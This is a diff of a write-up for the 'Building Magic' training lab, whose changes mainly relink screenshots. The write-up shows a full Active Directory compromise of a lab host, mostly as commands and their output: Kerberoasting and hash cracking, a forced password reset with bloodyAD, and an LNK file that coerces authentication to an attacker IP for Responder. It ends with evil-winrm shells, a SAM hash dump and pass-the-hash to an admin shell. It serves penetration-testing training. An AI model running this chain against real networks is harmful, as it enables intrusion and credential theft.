@@ -1,4 +1,4 @@
-Lab: Building Magic
+# [Lab: Building Magic](https://www.hacksmarter.org/courses/8c4fe505-a724-407f-a425-8e17503d4380)
 
 The following information was provided before starting the lab
 
@@ -30,7 +30,7 @@ id	username	full_name	role		password
 -----
 ## Nmap Scan
 ```
-└─$ sudo nmap -T4 -sS -sC -sV 10.1.213.153 -v -oA BuildingMagic 
+sudo nmap -T4 -sS -sC -sV 10.1.213.153 -v -oA BuildingMagic 
 PORT     STATE SERVICE       VERSION
 53/tcp   open  domain        Simple DNS Plus
 80/tcp   open  http          Microsoft IIS httpd 10.0
@@ -130,7 +130,9 @@ bfaf794a81438488e57ee3954c27cd75
 47d23284395f618bea1959e710bc68ef
 ```
  - Site like [crackstation](https://crackstation.net/) can be used
- ![[Pasted image 20251103221558.png]]
+<img width="1016" height="609" alt="image" src="https://github.com/user-attachments/assets/29ead5d8-91cc-41a4-95cf-a1335592ebfc" />
+
+ 
  - Hashcat can also be used
  `hashcat.exe -a 0 -m 0 hahahahashes.txt rockyou.txt -O`
 
@@ -140,7 +142,7 @@ bfaf794a81438488e57ee3954c27cd75
 With the user credentials can enuermate the users on the host
 
 ```
-└─$ netexec smb 10.1.213.153 -u 'r.widdleton' -p 'lilronron' --users
+netexec smb 10.1.213.153 -u 'r.widdleton' -p 'lilronron' --users
 SMB         10.1.213.153    445    DC01             [*] Windows Server 2022 Build 20348 x64 (name:DC01) (domain:BUILDINGMAGIC.LOCAL) (signing:True) (SMBv1:False)
 SMB         10.1.213.153    445    DC01             [+] BUILDINGMAGIC.LOCAL\r.widdleton:lilronron 
 SMB         10.1.213.153    445    DC01             -Username-                    -Last PW Set-       -BadPW- -Description-                                               
@@ -154,7 +156,8 @@ SMB         10.1.213.153    445    DC01             h.grangon                   
 SMB         10.1.213.153    445    DC01             a.flatch                      2025-06-15 02:57:05 0       Project Manager 
 
 ```
-![[Pasted image 20251103222727.png]]
+
+Users.txt
 ```
 Administrator
 Guest
@@ -168,7 +171,7 @@ a.flatch
 
 ## Checking Shares
 ```
-└─$ netexec smb 10.1.213.153 -u 'r.widdleton' -p 'lilronron' --shares                
+netexec smb 10.1.213.153 -u 'r.widdleton' -p 'lilronron' --shares                
 SMB         10.1.213.153    445    DC01             [*] Windows Server 2022 Build 20348 x64 (name:DC01) (domain:BUILDINGMAGIC.LOCAL) (signing:True) (SMBv1:False)
 SMB         10.1.213.153    445    DC01             [+] BUILDINGMAGIC.LOCAL\r.widdleton:lilronron 
 SMB         10.1.213.153    445    DC01             [*] Enumerated shares
@@ -190,8 +193,6 @@ smb: \> dir
 NT_STATUS_ACCESS_DENIED listing \*
 smb: \> 
 ```
-![[Pasted image 20251103224228.png]]
-![[Pasted image 20251103224250.png]]
 
 ----
 ## Kerberoasting
@@ -210,14 +211,13 @@ HOGWARTS-DC/r.hagrid.WIZARDING.THM:60111  r.haggard            2025-05-15 17:09:
 $krb5tgs$23$*r.haggard$BUILDINGMAGIC.LOCAL$buildingmagic.local/r.haggard*$d1d6de829df8403ef9ea9bd1a41a2028$285a778442acdc33274824822c77e9c28560a9b9307a9c18937628ade2f5a826847e83249af21a4ae7197deec23a729fd34c4811426f5206bb1e5b0fda59a8bf373bed8b796bdfca9e36461a3451a2ce207efb2f75413f9b65b68dd1c02f6091ebabfa71966a9bfb42d56584cb3cff1e26ffed5963e781a1ca4a9307cf6fc30d92076cbb120ce3d79b76065919735ecaad82178b774bfc064214648c518923af8757cb30bc3d9585261c01f9c3915d84c4af0e73e6324c895512897175d6e92718a6946ef6538190f0eb9bff93231d1fa896f40ab64f9862d78d3055f4fffd6eb11a2179919ac842737bf03c34515ae52e1edeba1234e621d32b6ffee7b4abb1be78705e1833b2ef6350e55d09a6cbd34b13722e3f8af868de974b80dd95126dc461dc5e03e6de3dc7dd210259aa6c715bff1ea7763f1beb42e85a11b94f580f3fca25d01431724a559d2f5142233fce6df24d3083493e683a29025ddc2a8178152f5b08dc1fd5b279da72d1ee65424fcb36ec7de3d42943f911bfc4972c10124d6f3c9d8fa9fe50e478281d919b0dd16186ab11ff919b7be0e6d37da0a4a008e0191e1f3fbc3726a2fd6b5ee5b2b0aa29fc0c8079943ba824ee141cf513eb8b05613dcb68ae4fe2ce244d662ac7d6237f9401df271aa37bfc45c35e4cc0351747e0e889abaf1adcf17b321650f44f602a111ae9e07a0505fe54ad37cc0718cd59bf3ca725211c0e402ba89b8c440afbc3c4ba082d318d2a1fa098fc4a9d5a1d9e23d80f082bd05c9c4d4ba1264a1699c7a24c3fe6c8c1b04701ac1eda8b9ff6c4c8a6b002484bb5206a47cdce183d347b4297e7101ad512deae88233b4a6cd1067b6598265921f166a7524a97e5f7727d67ab10f79057a69e2ee53a9ef2515975818d9b49499c7020dd327eda1640dac7e2bdfa8f2ed5ac91ab5344874980433d4574672d79280b894fa61c675809560869d46f524379426c5aca601f7aeec2353a85632a4aef53c4d44198957f37b4a8724313ef482dccdcc1bfa201cd86303f3c35f0fd0ccd5e5c7685a31ef9cfdd532322059841b213b0576e868ea33a2e3b7535256a5770ee2fd004bc381f8d9dac93e01bb228b221557b8eef4f825ce167361fa8fbe30f0c68a7285cc599864639086156f0397eb52345472705456d486dd4b059bc2b5f46dc684845b3f3837f1a165ddd3574731068836af8ade7e2f701ce0eec00c3a69baecc3b19198bc486daa74c179f522654bbdf1ed436aa814903c105ebfb2ef4261e804f1516547162c84053b001fb3b7bb817e41247cf9a05fdafe0a37b9966ceb7ff7a4867e288579c82841097bb83b0c6f9da75342b654c93c51a34280a7a660e10073285ec02c12c74de62f6465d7129430825f6d42e5ea487f4d815d089166498f38108589f2f39698302e71708e4f4b6de5dd676eb7b83a2ae109f412e8bb77d5de93781c6c809c7081d382c9c37e809938a670c0e105466adfe1510ae3bfb919c3eb28f4e4745376c01db27e140cb797a326c94071be00dbad3b52fe06a3dcb50a13b1647
 ```
 
-![[Pasted image 20251103222937.png]]
+
 ## Kerberoasting - Crack the Hash
 
 - `hashcat.exe -m 13100 hahahahashes.txt rockyou.txt -O`
 ```
 $krb5tgs$23$*r.haggard$BUILDINGMAGIC.LOCAL$buildingmagic.local/r.haggard*$d1d6de829df8403ef9ea9bd1a41a2028$285a778442acdc33274824822c77e9c28560a9b9307a9c18937628ade2f5a826847e83249af21a4ae7197deec23a729fd34c4811426f5206bb1e5b0fda59a8bf373bed8b796bdfca9e36461a3451a2ce207efb2f75413f9b65b68dd1c02f6091ebabfa71966a9bfb42d56584cb3cff1e26ffed5963e781a1ca4a9307cf6fc30d92076cbb120ce3d79b76065919735ecaad82178b774bfc064214648c518923af8757cb30bc3d9585261c01f9c3915d84c4af0e73e6324c895512897175d6e92718a6946ef6538190f0eb9bff93231d1fa896f40ab64f9862d78d3055f4fffd6eb11a2179919ac842737bf03c34515ae52e1edeba1234e621d32b6ffee7b4abb1be78705e1833b2ef6350e55d09a6cbd34b13722e3f8af868de974b80dd95126dc461dc5e03e6de3dc7dd210259aa6c715bff1ea7763f1beb42e85a11b94f580f3fca25d01431724a559d2f5142233fce6df24d3083493e683a29025ddc2a8178152f5b08dc1fd5b279da72d1ee65424fcb36ec7de3d42943f911bfc4972c10124d6f3c9d8fa9fe50e478281d919b0dd16186ab11ff919b7be0e6d37da0a4a008e0191e1f3fbc3726a2fd6b5ee5b2b0aa29fc0c8079943ba824ee141cf513eb8b05613dcb68ae4fe2ce244d662ac7d6237f9401df271aa37bfc45c35e4cc0351747e0e889abaf1adcf17b321650f44f602a111ae9e07a0505fe54ad37cc0718cd59bf3ca725211c0e402ba89b8c440afbc3c4ba082d318d2a1fa098fc4a9d5a1d9e23d80f082bd05c9c4d4ba1264a1699c7a24c3fe6c8c1b04701ac1eda8b9ff6c4c8a6b002484bb5206a47cdce183d347b4297e7101ad512deae88233b4a6cd1067b6598265921f166a7524a97e5f7727d67ab10f79057a69e2ee53a9ef2515975818d9b49499c7020dd327eda1640dac7e2bdfa8f2ed5ac91ab5344874980433d4574672d79280b894fa61c675809560869d46f524379426c5aca601f7aeec2353a85632a4aef53c4d44198957f37b4a8724313ef482dccdcc1bfa201cd86303f3c35f0fd0ccd5e5c7685a31ef9cfdd532322059841b213b0576e868ea33a2e3b7535256a5770ee2fd004bc381f8d9dac93e01bb228b221557b8eef4f825ce167361fa8fbe30f0c68a7285cc599864639086156f0397eb52345472705456d486dd4b059bc2b5f46dc684845b3f3837f1a165ddd3574731068836af8ade7e2f701ce0eec00c3a69baecc3b19198bc486daa74c179f522654bbdf1ed436aa814903c105ebfb2ef4261e804f1516547162c84053b001fb3b7bb817e41247cf9a05fdafe0a37b9966ceb7ff7a4867e288579c82841097bb83b0c6f9da75342b654c93c51a34280a7a660e10073285ec02c12c74de62f6465d7129430825f6d42e5ea487f4d815d089166498f38108589f2f39698302e71708e4f4b6de5dd676eb7b83a2ae109f412e8bb77d5de93781c6c809c7081d382c9c37e809938a670c0e105466adfe1510ae3bfb919c3eb28f4e4745376c01db27e140cb797a326c94071be00dbad3b52fe06a3dcb50a13b1647:rubeushagrid
 ```
-![[Pasted image 20251103223324.png]]
 
 -------
 ## Use Bloodhound
@@ -247,7 +247,6 @@ INFO: Querying computer: DC01.BUILDINGMAGIC.LOCAL
 INFO: Done in 00M 07S
 
 ```
-![[Pasted image 20251103223642.png]]
 
 ```
 20251103223538_computers.json
@@ -262,27 +261,29 @@ INFO: Done in 00M 07S
 
 ## Launching Bloodhound
 - User R.Haggard has the ability to change the password of H.Potch
-![[Pasted image 20251103225056.png]]The user R.HAGGARD@BUILDINGMAGIC.LOCAL has the capability to change the user H.POTCH@BUILDINGMAGIC.LOCAL's password without knowing that user's current password.
-![[Pasted image 20251103225121.png]]
+<img width="1112" height="220" alt="image" src="https://github.com/user-attachments/assets/e21b21b5-a843-4bb4-b247-6340d3b7e281" />
+
+
+The user R.HAGGARD@BUILDINGMAGIC.LOCAL has the capability to change the user H.POTCH@BUILDINGMAGIC.LOCAL's password without knowing that user's current password.
+
+
 ### BloodyAd can be used to do this
 
 ```
 bloodyAD --host "10.1.213.153" -d "buildingmagic.local" -u "r.haggard" -p "rubeushagrid" set password "h.potch" "newP@ssword2022"
 [+] Password changed successfully!
-
 ```
-![[Pasted image 20251103225239.png]]
 
 ### Check if Credentials Are Valid
 ```
-└─$ netexec smb 10.1.213.153 -u 'h.potch' -p 'newP@ssword2022'   
+netexec smb 10.1.213.153 -u 'h.potch' -p 'newP@ssword2022'   
 SMB         10.1.213.153    445    DC01             [*] Windows Server 2022 Build 20348 x64 (name:DC01) (domain:BUILDINGMAGIC.LOCAL) (signing:True) (SMBv1:False)
 SMB         10.1.213.153    445    DC01             [+] BUILDINGMAGIC.LOCAL\h.potch:newP@ssword2022 
 
 ```
-![[Pasted image 20251103225359.png]]
 
 -------
+
 ## h.potch has Read Write Access to File-Share
 
 ```
@@ -300,18 +301,29 @@ SMB         10.1.213.153    445    DC01             NETLOGON        READ        
 SMB         10.1.213.153    445    DC01             SYSVOL          READ            Logon server share 
                                                                                                                      
 ```
-![[Pasted image 20251103225457.png]]
+
 ## LNK Attack
 ```
 netexec smb 10.1.213.153 -u h.potch -p newP@ssword2022 -M slinky -o SERVER=10.200.16.104 NAME=important
+[*] Ignore OPSEC in configuration is set and OPSEC unsafe module loaded
+SMB         10.1.213.153    445    DC01             [*] Windows Server 2022 Build 20348 x64 (name:DC01) (domain:BUILDINGMAGIC.LOCAL) (signing:True) (SMBv1:False)
+SMB         10.1.213.153    445    DC01             [+] BUILDINGMAGIC.LOCAL\h.potch:newP@ssword2022 
+SMB         10.1.213.153    445    DC01             [*] Enumerated shares
+SMB         10.1.213.153    445    DC01             Share           Permissions     Remark
+SMB         10.1.213.153    445    DC01             -----           -----------     ------
+SMB         10.1.213.153    445    DC01             ADMIN$                          Remote Admin
+SMB         10.1.213.153    445    DC01             C$                              Default share
+SMB         10.1.213.153    445    DC01             File-Share      READ,WRITE      Central Repository of Building Magic's files.
+SMB         10.1.213.153    445    DC01             IPC$            READ            Remote IPC
+SMB         10.1.213.153    445    DC01             NETLOGON        READ            Logon server share 
+SMB         10.1.213.153    445    DC01             SYSVOL          READ            Logon server share 
+SLINKY      10.1.213.153    445    DC01             [+] Found writable share: File-Share
+SLINKY      10.1.213.153    445    DC01             [+] Created LNK file on the File-Share share
+                                                                                                      
 ```
 
-![[Pasted image 20251103225744.png]]
 `sudo responder -I tun0`
 
-
-
-![[Pasted image 20251103225826.png]]
 ```
 [SMB] NTLMv2-SSP Client   : 10.1.213.153
 [SMB] NTLMv2-SSP Username : BUILDINGMAGIC\h.grangon
@@ -323,12 +335,12 @@ netexec smb 10.1.213.153 -u h.potch -p newP@ssword2022 -M slinky -o SERVER=10.20
 ```
 H.GRANGON::BUILDINGMAGIC:6238d57d5b51be69:61cf68ca3892f99ce506cc38273b7b63:0101000000000000001fc4ff144ddc01e66b0dca8fc39d4b00000000020008004b0059004400440001001e00570049004e002d0052004a0045004c005800370038004a004a003200590004003400570049004e002d0052004a0045004c005800370038004a004a00320059002e004b005900440044002e004c004f00430041004c00030014004b005900440044002e004c004f00430041004c00050014004b005900440044002e004c004f00430041004c0007000800001fc4ff144ddc010600040002000000080030003000000000000000000000000040000029983f78c2efdca7cebdc28cb0d1a5f0e9267f918fb94cd0878e3f5458ab4be80a001000000000000000000000000000000000000900240063006900660073002f00310030002e003200300030002e00310036002e003100300034000000000000000000:magic4ever
 ```
-![[Pasted image 20251103230439.png]]
 ## H.gragon can pop a shell
 ## In Bloodhound
-![[Pasted image 20251103231108.png]]
+<img width="953" height="256" alt="image" src="https://github.com/user-attachments/assets/b13dab61-f10b-440f-a65b-45014ddb396b" />
 
-![[Pasted image 20251103230856.png]]
+
+
 - `netexec winrm 10.1.213.153 -u h.grangon -p magic4ever`
 ```
 └─$ netexec winrm 10.1.213.153 -u h.grangon -p magic4ever  
@@ -341,12 +353,8 @@ WINRM       10.1.213.153    5985   DC01             [+] BUILDINGMAGIC.LOCAL\h.gr
 
 -----
 ## Iniitial Foothold
-``evil-winrm -i 10.1.213.153 -u h.grangon -p 'magic4ever'``
-
-![[Pasted image 20251103231540.png]]
-
 ```
-└─$ evil-winrm -i 10.1.213.153 -u h.grangon -p 'magic4ever'
+evil-winrm -i 10.1.213.153 -u h.grangon -p 'magic4ever'
                                         
 Evil-WinRM shell v3.7
                                         
@@ -372,7 +380,6 @@ Mode                 LastWriteTime         Length Name
 701b51527b6d4105d9b16b412af2d604
 
 ```
-![[Pasted image 20251103231658.png]]
 
 ## Check Privelges
 ```
@@ -389,7 +396,7 @@ SeChangeNotifyPrivilege       Bypass traverse checking       Enabled
 SeIncreaseWorkingSetPrivilege Increase a process working set Enabled
 
 ```
-![[Pasted image 20251103231807.png]]
+
 
 ```
 *Evil-WinRM* PS C:\Users\h.grangon\Desktop> mkdir C:\Temp
@@ -433,7 +440,7 @@ Info: Downloading C:\Temp\system to system
                                                                                                                                                                                                                                 
 Info: Download successful!                                                                      
 ```
-![[Pasted image 20251103232600.png]]
+
 ## Dump Hashes
 ```
 └─$ pypykatz registry --sam sam system
@@ -450,11 +457,11 @@ DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c0
 WDAGUtilityAccount:504:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
 ```
 ---
-![[Pasted image 20251103232709.png]]
+
 
 ## Password Spray
 Administrator didn't work
-![[Pasted image 20251103232855.png]]
+
 ```
 └─$ netexec smb 10.1.213.153 -u Administrator -H 520126a03f5d5a8d836f1c4f34ede7ce
 SMB         10.1.213.153    445    DC01             [*] Windows Server 2022 Build 20348 x64 (name:DC01) (domain:BUILDINGMAGIC.LOCAL) (signing:True) (SMBv1:False)
@@ -479,10 +486,8 @@ SMB         10.1.213.153    445    DC01             [+] BUILDINGMAGIC.LOCAL\a.fl
                                                                                                                                   
 ```
 
-![[Pasted image 20251103233304.png]]
-## Shell As Admin
-![[Pasted image 20251103233406.png]]
 
+## Shell As Admin
 ```
 └─$ netexec winrm 10.1.213.153 -u a.flatch -H 520126a03f5d5a8d836f1c4f34ede7ce 
 WINRM       10.1.213.153    5985   DC01             [*] Windows Server 2022 Build 20348 (name:DC01) (domain:BUILDINGMAGIC.LOCAL)
@@ -491,6 +496,7 @@ WINRM       10.1.213.153    5985   DC01             [*] Windows Server 2022 Buil
 WINRM       10.1.213.153    5985   DC01             [+] BUILDINGMAGIC.LOCAL\a.flatch:520126a03f5d5a8d836f1c4f34ede7ce (Pwn3d!)
 
 ```
+
 ```
 └─$ evil-winrm -i 10.1.213.153 -u a.flatch -H 520126a03f5d5a8d836f1c4f34ede7ce
                                         
@@ -506,4 +512,3 @@ Info: Establishing connection to remote endpoint
 *Evil-WinRM* PS C:\Users\a.flatch\Documents> 
 
 ```
-![[Pasted image 20251103233625.png]]
